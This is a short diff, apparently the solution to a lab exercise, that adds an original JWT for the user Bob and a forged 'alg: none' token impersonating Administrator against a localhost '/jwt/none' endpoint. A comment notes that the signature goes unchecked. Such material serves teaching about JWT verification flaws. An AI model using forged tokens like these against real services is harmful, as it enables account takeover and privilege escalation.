@@ -1,0 +1,10 @@
+# Original token, for Bob:
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiQm9iIiwicm9sZSI6IlVzZXIiLCJpYXQiOjE3MzM5MjAxODgsImF1ZCI6Imh0dHBzOi8vMTI3LjAuMC4xL2p3dC9ub25lIn0.PdAzqECI-aOcksaVcGCpaoelQVK4d7QR5PBOUpLtnRk
+
+
+# New, modified token, for Administrator:
+
+eyJhbGciOiJub25lIn0.eyJhY2NvdW50IjoiQWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzMzOTIwMTg4LCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9.
+
+# The signature isn't verified, so we can freely change the payload
